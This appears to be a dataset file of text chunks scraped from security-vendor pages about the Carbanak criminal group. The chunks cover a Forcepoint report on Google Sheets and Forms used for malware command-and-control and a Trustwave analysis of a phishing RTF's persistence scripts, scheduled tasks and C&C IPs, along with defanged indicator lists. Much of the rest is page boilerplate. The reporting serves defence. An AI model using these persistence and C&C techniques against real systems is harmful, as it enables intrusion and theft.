        "text": "Mobile threats\nFinancial threats\nSpam and phishing\nIndustrial threats\nWeb threats\nVulnerabilities and exploits\n\nCategoriesCategories\n\nAPT reports\nMalware descriptions\nSecurity Bulletin\nMalware reports\nSpam and phishing reports\nSecurity technologies\nResearch\nPublications\n\nOther sections\n\nArchive\nAll tags\nWebinars\nAPT Logbook\nStatistics\nEncyclopedia\nThreats descriptions\nKSB 2023\n\n \n\n\n\n\n\n\n\n\n\n\u00a9 2023 AO Kaspersky Lab.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Registered trademarks and service marks are the property of their respective owners.\n\n\n\n Privacy Policy\nLicense Agreement\nCookies\n\n\n\n\n\n\n\n\n\n\n\n\nSubscribe to our weekly e-mails\nThe hottest research right in your inbox\n\n\n\n\nEmail\n*\n\nI agree to provide my email address to \u201cAO Kaspersky Lab\u201d to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the \u201cunsubscribe\u201d link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.\n\n \n Subscribe\n\n\n\n\n\n\n\n\n\n\n\u0394\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNotifications",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCarbanak Group uses Google for malware command-and-control | Forcepoint \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSkip to main content\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  Forcepoint\n\n\n \n\n\n\nGovernment\nPartnersPartnersPartner Login\nFind a Partner\nBecome a Partner\nGlobal Partner Program\nTechnology Partners\nFind a Distributor\n\nServices & SupportServices & SupportSupport Login\nProfessional Services\nTraining\n\nCompanyCompanyCustomers\nNewsroom\nWork With Us\nEvents\nContact Us\nForcepoint Trust Hub\n\n \n\n\n\n\nEN - EnglishEN - EnglishEN - EnglishES - Espa\u00f1ol (Am\u00e9rica Latina)FR - Fran\u00e7aisDE - DeutschIT - ItalianoPT-BR - Portugu\u00easZH-HANS - \u7b80\u4f53\u4e2d\u6587ZH-HANT - \u7e41\u9ad4\u4e2d\u6587JA - \u65e5\u672c\u8a9eKO - \ud55c\uad6d\uc5b4TR - T\u00fcrk\u00e7eAR - \u0627\u0644\u0639\u0631\u0628\u064a\u0629EN - EnglishES - Espa\u00f1ol (Am\u00e9rica Latina)FR - Fran\u00e7aisDE - DeutschIT - ItalianoPT-BR - Portugu\u00easZH-HANS - \u7b80\u4f53\u4e2d\u6587ZH-HANT - \u7e41\u9ad4\u4e2d\u6587JA - \u65e5\u672c\u8a9eKO - \ud55c\uad6d\uc5b4TR - T\u00fcrk\u00e7eAR - \u0627\u0644\u0639\u0631\u0628\u064a\u0629EN - English\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n            Enter your keywords          \n\n\n\n\n\n\n\n\n            Is Type          \n\n\n\n\n\n\n\n \n\n\n \n\n\n\n\n\n\n\n \n\n\n\nJump to\n\n\n\n Why Forcepoint\nWhy Forcepoint group\n \nAbout Us\nOur vision and mission\n  \nOur Approach\nOur data-first approach to cybersecurity\n  \nOur Customers\nWe help people work freely, securely and with confidence\n    Data-first SASE\nData-first SASE group (row1)\n group (FP ONE)\n \nForcepoint ONE SSE\nData-first SASE starts with Forcepoint ONE.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Learn More\n   group (products)\n group (products 1st row)\n Simplify Security with SSE\n  \nCASB\nSecure data on any public cloud application.\n  \n  ZTNA\nRemotely access every private web app on any device.\n  \n  SWG\nSafely browse the web and download files.\n  \n DLP SaaS\nPrevent data exfiltration from the cloud with DLP SaaS.\n   group (products 2nd row)\n Work Safely Anywhere With SASE\n  \nFlexEdge Secure SD-WAN\nConnect and protect branches, offices and more.\n     group (row2)\n Schedule a Live Demo\n  On-Demand Demo\n    All Products and Solutions\nAll Products and Solutions group (popular products 1st row)\n Products\n  group (Data Security)\n Data Security\n  \nEnterprise DLP\nIndustry-leading data security for web, cloud, email, network and endpoint.\n    group (Products)\n \nData Visibility\nGet a panoramic view of data at rest with AI and ML.\n  \n  Insider Threat\nMonitor, analyze and gain insight on user behavior.\n  \n  Data Classification\nIncrease the accuracy and efficiency of classification.\n  \n ",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "group (solutions 1st row)\n Solutions\n  Securing Data Everywhere\n  Embrace ChatGPT and Protect Your Data\n  Adopt Continuous Zero Trust Security\n  Safely Use MS 365\n   group (popular products 2nd row)\n group (Network and Threat Protection)\n Network and Threat Protection\n  \nFlexEdge Secure SD-WAN\nSecure the network.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Connect and protect offices, branches and remote sites.\n   products (2nd row)\n \n Cross Domain Solutions\nImprove security and access for segmented networks.\n  \n ",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "NGFW\nModernize connectivity with next-generation security.\n  \n  Zero Trust CDR\nPrevent files from launching known or zero-day attacks.\n  \n RBI\nRender risky websites in a container to browse safely.\n    ",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "group (solutions 2nd row)\n  Solutions\n  Protect Remote Offices\n  Securely Enable Remote Workers\n   group (products cta column 1)\n View All Products\n   group (products cta column 2)\n View All Solutions\n    Resources\nResources group (links column)\n group (resource links)\n Blog\n  Webcasts\n  Podcasts\n  Analyst Reports\n  Customer Stories\n  Resource Library\n  Events\n  Training\n     group (cyber edut)\n \n Cyber Edu\nLearn More\n    group (cta column)\n group (cards)\n  Guide\nUltimate Guide to SASE\nDive into the Guide\n  Video\nChatGPT for IT: Increase Productivity with Generative AI using Forcepoint Data Security\nWatch the Video\n  Analyst Report\n2023 Gartner\u00ae Magic Quadrant\u2122 for Single-Vendor SASE\nRead the Report\n  Podcast\nThe Radical Transparency Opportunity in Cybersecurity\nListen to the Podcast\n   View All Resources\n    Talk to an Expert\n  \n\n\n\nMain Menu\n\n\n\n\n\n\nYou are hereHome:Blogs:Carbanak Group uses Google for malware command-and-control \n\n\n\n\n\n\n\n\n\n\n\t\t\tX-Labs\t\t\n\n\n\n\n    January 17, 2017  \u00a0\u00a0|\u00a0\u00a05 min read\n\n\n\n\nCarbanak Group uses Google for malware command-and-control\n\n\n\n\n\n\n\nGoogle Malware \n\n\n\n\n\n\n\n\n\n\nForcepoint Security Labs\u2122 recently investigated a trojanized RTF document which we tied to the Carbank criminal gang. The document contains an encoded Visual Basic Script (VBScript) typical of previous Carbanak malware.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Recent samples of the malware\u00a0have now included\u00a0the ability to use Google services for command-and-control (C&C) communication.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We have notified Google of the abuse and are working with them to share additional information.\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Carbanak (also known as Anunak) are a group of financially motivated criminals first exposed in 2015. The actors typically steal from financial institutions using targeted malware.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Recently a new Carbanak attack campaign dubbed\u00a0\"Digital Plagiarist\"\u00a0was exposed where the group used weaponized office documents hosted on mirrored domains, in order to distribute malware.\n Weaponized document\nThe RTF document we analyzed (SHA1\u00a01ec48e5c0b88f4f850facc718bbdec9200e4bd2d) has an embedded\u00a0OLE\u00a0object which contains a VBScript file.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When the document is opened the targeted user is lured into double-clicking on the embedded OLE object which is disguised as an image:\n\n",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Encoded VBScript malware\nThe VBScript malware inside the RTF document (SHA1\u00a0cd75662751c59951717b4704ea2cdb6fb7ec19bc) is an encoded VBScript file. We decoded the script and found hallmarks typical of the Carbanak group's VBScript malware, however we also found the addition of a new \"ggldr\" script module.\n\n The module is base64 encoded inside the main VBScript file along with various other VBScript modules used by the malware. When we analyzed the script we noticed that it is capable of using Google services as a C&C channel.\n",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Abusing Google for C&C communication\nThe \"ggldr\" script will send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms services.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For each infected user a unique Google Sheets spreadsheet is dynamically created in order to manage each victim.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The use of a legitimate third party service like this one gives the attacker the ability to hide in plain sight.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is unlikely that these hosted Google services are blocked by default in an organization, so it is more likely that the attacker will establish a C&C channel successfully.\n ",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Upon the first attempt to contact the hard-coded Google Apps Script URL with the user's unique infection ID, the C&C will state that no spreadsheet currently exists for the user. The malware will then send two requests to another hard-coded Google Forms URL which will result in the creation of unique Google Sheets spreadsheet and Google Form IDs for the victim.\n  The second time the Google Apps Script is requested, the C&C will return the unique Google Sheet and Google Form ID values:\n\n\nThe \"entry\" value is also a unique ID which is sent with each subsequent Google Forms C&C request.\n ",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Protection statement\nForcepoint\u2122 customers are protected against this\u00a0threat\u00a0via TRITON\u00ae ACE at the following stages\u00a0of attack:\nStage 5 (Dropper File) -",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Summary\nThe Carbanak actors continue to look for stealth techniques to evade detection. Using Google as an independent C&C channel is likely to be more successful than using newly created domains or domains with no reputation. Forcepoint will continue to monitor this group's activities and share data with trusted partners.\n",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Indicators of Compromise\nCarbanak Documents\n\n\n\n\n1ec48e5c0b88f4f850facc718bbdec9200e4bd2d (3-ThompsonDan.rtf)\n400f02249ba29a19ad261373e6ff3488646e95fb (order.docx)\n88f9bf3d6e767f1d324632b998051f4730f011c3 (claim.rtf)\n\n\n\n\nCarbanak Google Apps Script C&Cs\n\n\n\n\nhxxps://script.google[.]com/macros/s/AKfycbzuykcvX7j3TlBNyQfxtB1mqii31b4VTON640yiRJT0t6rS4s4/exec\nhxxps://script.google[.]com/macros/s/AKfycbxxx5DHr0F8AYhLuDjnp7kGNELq6g27J4c_JWWx1p1nDfZh6InO/exec\nhxxps://script.google[.]com/macros/s/AKfycbwZHCgg5EsCiPup_mNxDbSX7k7yBMeXWenOVN1BWXHmyBpb8ng/exec\n\n\n\n\nCarbanak Google Forms C&Cs\n\n\n\n\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLScx9gwNadC7Vjo11mXLbU3aBQRrqVpoWjmNJ1ZneqpjaYLE3g/formResponse\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLSfE9kshYBFSDAfRclW8m9rAdajqoYhzhEYmEAgZexE3LQ-17A/formResponse\nhxxps://docs.google[.]com/forms/d/e/1FAIpQLSdcdE7lTEiqV5MW3Up8Hgcy5NGkIKnLKoe0YPFriD4_9qYq9A/formResponse\n\n\n\n\nCarbanak C&Cs\n\n\n\n\nhxxp://atlantis-bahamas[.]com/css/informs.jsp\nhxxp://138[.]201[.]44[.]4/informs.jsp\n\n\n\n\nCarbanak Cobalt Strike / Meterpreter DNS Beacon C&Cs\n\n\n\n\naaa.stage.15594901.en.onokder[.]com\naaa.stage.4710846.ns3.kiposerd[.]com\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n      About Forcepoint  \n\n\n\n    Forcepoint is the leading user and data protection cybersecurity company, entrusted to safeguard organizations while driving digital transformation and growth.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Our solutions adapt in real-time to how people interact with data, providing secure access while enabling employees to create value.  \n\n",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Conversion Type\n\n\n\n\n\n\n\n\n\n\nCompanyNewsroom\nWork With Us\nExecutive Team\nBlog\nEvents\nFree E-Learning Courses\n\nFeedbackAll Products\nAll Solutions\nCustomer Stories\nReport a Vulnerability\nContact Us\n\n \n\n\n\nTerms & ConditionsLegal and PrivacyManage Cookies\n\u00a9 2023 Forcepoint \n\n\n\nLinkedIn\nTwitter\nFacebook\nYouTube\nRSS\n \n\n\n\n\n\n\n\n\n\n      Inline CSS for Main Menu    \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSchedule a Demo  Privacy is our priority.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We do not sell or otherwise share personal information for money or anything of value.\n We use strictly necessary cookies to enable site functionality and improve the performance of our website. We also store cookies to personalize the website content and to serve more relevant content to you.",
        "source": "Carbanak Group uses Google for malware command-and-control _ Forcepoint.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\n\n\nCarbanak Continues To Evolve: Quietly Creeping into Remote Hosts\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWhen you visit our website, we and our third-party service providers may use cookies and similar technologies to collect information about you.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This information may be used to measure website usage and performance, optimize user experience, and provide targeted advertisements.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For more information on our use of cookies and tracking technologies please review our Privacy PolicyCookie PreferencesAccept All CookiesDecline All Cookies\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "24 HOUR HOTLINES\n                                    \n\n\n\n\n\n\n                                            AMERICAS\n                                          \n\n+1 855 438 4305\n                                            \n\n\n\n\n                                            EMEA\n                                          \n\n+44 8081687370\n                                            \n\n\n\n\n                                            AUSTRALIA\n                                          \n\n+61 1300901211\n                                            \n\n\n\n\n                                            SINGAPORE\n                                          \n\n+65 68175019\n                                            \n\n\n\n\n\nRecommended Actions\n                                      \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks. Learn More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a Demo\n                  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a DemoFirst Name*Last Name*Company Name*Business Email*Country*Please SelectUnited StatesUnited KingdomAustraliaGermanyMexicoNew ZealandSingaporeOtherAfghanistan\u00c5land IslandsAlbaniaAlgeriaAmerican SamoaAndorraAngolaAnguillaAntarcticaAntigua and BarbudaArgentinaArmeniaArubaAsia/Pacific RegionAustriaAzerbaijanBahamasBahrainBangladeshBarbadosBelarusBelgiumBelizeBeninBermudaBhutanBoliviaBosnia and HerzegovinaBotswanaBouvet IslandBrazilBritish Indian Ocean TerritoryBritish Virgin IslandsBruneiBulgariaBurkina",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "VerdeCaribbean NetherlandsCayman IslandsCentral African RepublicChadChileChinaChristmas IslandCocos (Keeling) IslandsColombiaComorosCongoCook IslandsCosta RicaCote d'IvoireCroatiaCubaCura\u00e7aoCyprusCzech RepublicDemocratic Republic of the CongoDenmarkDjiboutiDominicaDominican RepublicEast TimorEcuadorEgyptEl SalvadorEquatorial GuineaEritreaEstoniaEthiopiaEuropeFalkland IslandsFaroe IslandsFijiFinlandFranceFrench GuianaFrench PolynesiaFrench Southern and Antarctic LandsGabonGambiaGeorgiaGhanaGibraltarGreeceGreenlandGrenadaGuadeloupeGuamGuatemalaGuernseyGuineaGuinea-BissauGuyanaHaitiHeard Island and McDonald IslandsHondurasHong KongHungaryIcelandIndiaIndonesiaIranIraqIrelandIsle of ManIsraelItalyJamaicaJapanJerseyJordanKazakhstanKenyaKiribatiKosovoKuwaitKyrgyzstanLaosLatviaLebanonLesothoLiberiaLibyaLiechtensteinLithuaniaLuxembourgMacauMacedonia (FYROM)MadagascarMalawiMalaysiaMaldivesMaliMaltaMarshall IslandsMartiniqueMauritaniaMauritiusMayotteMicronesiaMoldovaMonacoMongoliaMontenegroMontserratMoroccoMozambiqueMyanmar (Burma)NamibiaNauruNepalNetherlandsNetherlands AntillesNew CaledoniaNicaraguaNigerNigeriaNiueNorfolk IslandNorth KoreaNorthern Mariana IslandsNorwayOmanPakistanPalauPalestinePanamaPapua New GuineaParaguayPeruPhilippinesPitcairn IslandsPolandPortugalPuerto RicoQatarR\u00e9unionRomaniaRussiaRwandaSaint Barth\u00e9lemySaint HelenaSaint Kitts and NevisSaint LuciaSaint MartinSaint Pierre and MiquelonSaint Vincent and the GrenadinesSamoaSan MarinoSao Tome and PrincipeSaudi ArabiaSenegalSerbiaSeychellesSierra",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "IslandsSomaliaSouth AfricaSouth Georgia and the South Sandwich IslandsSouth KoreaSouth SudanSpainSri LankaSudanSurinameSvalbard and Jan MayenSwazilandSwedenSwitzerlandSyriaTaiwanTajikistanTanzaniaThailandTogoTokelauTongaTrinidad and TobagoTunisiaTurkeyTurkmenistanTurks and Caicos IslandsTuvaluU.S. Virgin IslandsUgandaUkraineUnited Arab EmiratesUnited States Minor Outlying IslandsUruguayUzbekistanVanuatuVatican CityVenezuelaVietnamWallis and FutunaWestern SaharaYemenZambiaZimbabweDeviceI agree to receive other communications from Trustwave. By clicking submit below, you agree to our Terms of Use and Privacy Policy. Additionally, you consent to allow Trustwave to store and process the personal information submitted above to provide you with the content requested.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In each campaign a malicious Word or RTF document was sent to specific employees, claiming the sender had trouble with the online ordering system, or was filing a lawsuit because a member of his group got sick after dining at one of the organization's restaurants. This social engineering scam is augmented with a personal phone call from the attacker, encouraging the intended victim to open the email attachment and click inside it.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The attacker then calls back 30 minutes later to check if the document was opened and hangs up as soon as the employee says yes.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Phishing continues to be an effective attack vector, and a number of systems at the organization became infected as a result of opening the attachment.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This time around, however, there are several twists added to the usual credit-card scraping and screen-shot grabbing malware previously seen in the November 2016 Carbanak campaign published in the Trustwave SpiderLabs blog (https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/).\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "I want to provide my sincere thanks to Rodel Mendrez,Trustwave SpiderLabs Senior Security Researcher, for all his assistance and knowledge. From malware reversing, to writing custom Python scripts, to historical knowledge of exploits, his help was invaluable to unraveling the many layers of trickery employed by the Carbanak malware writers. Thanks also to Brian Hussey,Trustwave SpiderLabs, VP of Cyber Threat Detection and Response and Mike Wilkinson, Trustwave SpiderLabs IR, North America Managing Consultant, for their review and guidance.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These documents, and their MD5 hashes, have appeared across several campaigns:\n\n\n\n\nName\n\n\nMD5 Hash\n\n\nFile Size\n\n\n\n\n2-reservation-1.docx\n\n\nD5FBFD2D1D71405A755C73E1CAC5DF23\n\n\n77,238 bytes\n\n\n\n\nClaim_Dave.docx\n\n\nFBF653B89A0814F515DDBDCF82CC3795\n\n\n119,256 bytes\n\n\n\n\nLetter 216 micro.docx\n\n\nFB442B402F73269BA5367142392B40C7\n\n\n371,888 bytes\n\n\n\n\n4404_inf04.docx\n\n\n3C12B6A6EBFFFDA75E4707067072C9CF\n\n\n395,857 bytes\n\n\n\n\nOrd2.rtf\n\n\nABAB101E4E25A989D2943C30447DD216\n\n\n1,075,043 bytes\n\n\n\n\nLet's take a look at what the most recent document, Ord2.rtf, puts into motion when opened.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Note that all of the files listed here are contained within the malicious RTF document and extracted when it is opened:\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "So that is two VBS and one PS1 file created by the infected RTF document. Persistence is established by creating a scheduled task that runs the main malware file every 25 minutes.\n\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Creates folder: %HOMEPATH%\\IntelCreates:    %HOMEPATH%\\Intel\\58d2a83f7778d5.36783181.vbs  --- Persistence script    % HOMEPATH%\\Intel\\58d2a83f777942.26535794.ps1 --- Malware downloader    %HOMEPATH%\\Intel\\58d2a83f777908.23270411.vbs --- Command-and-Control (CnC) malware creator    Scheduled task \"Intel\" that runs the persistence script every 25 minutes.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware downloader if it has not run yet.     The CnC malware creator script which creates additional malware and connects to 198.100.119.6 \t    via port 80, 443, or 8080.Notes:    The persistence script runs the malware downloader if it has not run yet.     The malware downloader injects 400+ bytes of code into process memory.          This code contains the domain name aaa.stage.14919005.www1.proslr3.com and retrieves and          executes shellcode stored in encoded DNS TXT records.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The CnC malware creator script &nbsp;creates additional malware and support files in a different folder:\nCreates folder: %HOMEPATH%\\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}Creates:     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f777638.60220156.ini --- Command/Status file     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f777688.78384945.ps1 --- Screenshot script     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f7776b5.64953395.txt --- Base64 container file     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f7776e0.72726761.vbs --- CnC script     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f777716.48248237.vbs --- INI processing script     %HOMEPATH%\\Intel\\{BFF4... 1C90}\\58d2a83f777788.86541308.vbs --- script updater     %HOMEPATH%\\Intel\\{BFF4...1C90}\\58d2a83f7777b0.39039198.vbs ---",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "CnC persistence scriptRuns:     CnC script if it has not run yet.      The INI processing script.      The CnC persistence script. Notes:     The Command/Status file is used to receive commands from CnC and maintain malware status.     ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The Base64 container file contains one or more lines of base64 code used to update these files:          Line 1: Command/Status file         Line 2: screenshot script         Line 3: CnC script         Line 4: INI processing script     The CnC script provides CnC communication and command  / status.          Connects to 198.100.119.6 via port 80, 443, or 8080     The INI processing script parses and processes INI file.         ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Commands: ScreenShot, runvbs, runexe, runps1, update, delete.          Delete command deletes all INI, PS1, VBS, TXT files, deletes Run key, and deletes scheduled task.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The script updater reads base64 strings from the Base64 container file and uses them to:     Create any .ini, ps1, or .vbs files that do not yet exist.     ",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Then runs the CnC script.      Then runs the INI processing script. The CnC persistence script creates Foxconn.lnk which points to the script updater.      Adds HKCU Run key CtMgk2y9v0_ for Foxconn.lnk.     Creates scheduled task \"ZSUUvsCJNF\" that runs the script updater every 25 minutes.      Then the CnC persistence script deletes itself.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In addition to another PS1 file and four more VBS scripts, we also see INI and TXT files being created.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "So much malware from one little RTF and a simple socially-engineered click to start everything in motion.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When you look at all the functionality built into those VBS and PS1 files you can see why Carbanak continues to be a significant threat. Even though some of the PS1 and VBS code is the same or very similar to that of previous attacks, there are some new twists in these files, and they are dramatic.\n Bring Back the INI Files\nThis new Carbanak campaign also resurrects the INI file, using it to issue commands to the compromised machine as well as to reflect the status of previous commands.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "INI files are text files used in earlier versions of Windows that contain software configuration details organized into sections, properties, and values.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Here is an \"in-use\" INI file from the investigation:\n\nThe \"last_cmd_id=2\" entry indicates that the malware has transmitted the victim's system information and a list of currently running processes back to the attacker, and is waiting for a new command to process.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This is quite clear from the following code snippet:\n\nSystem info sent to the attacker contains the following items:\n\nOS Name, Version,&nbsp;&nbsp; Service Pack,&nbsp;&nbsp; OS Manufacturer,&nbsp;&nbsp; Windows Directory,&nbsp;&nbsp; Locale\nAvailable Physical Memory, Total Virtual Memory,&nbsp;&nbsp; Available Virtual Memory\nOS Name, System Name,&nbsp;&nbsp; System Manufacturer,&nbsp;&nbsp; System Model,&nbsp;&nbsp; Time Zone\nTotal Physical Memory, Processor System Type,&nbsp;&nbsp; Processor,&nbsp;&nbsp; BIOS Version\nMicrosoft Office Apps, Computer name,&nbsp;&nbsp; Domain,&nbsp;&nbsp; User name\n\nThe INI processing script parses and processes the contents of the INI file, providing the following commands:\n\nScreenshot (save screenshot as screenshot.png)\nRunvbs\nRunexe\nRunps\nUpdate\nDelete\n\nThe Screenshot command takes a screenshot of the entire Desktop and saves it to the folder where the malware is installed.",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Here is a sample screenshot created by running the screenshot script:\n\n Depending on what a user has opened on their Desktop, the screenshot could end up providing the attacker with valuable information.\n",
        "source": "Carbanak Continues To Evolve_ Quietly Creeping into Remote Hosts.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The \"update\" command is particularly interesting, as it is used to update between one and four of the VBS / PS files created by the infected email attachment.\n ",
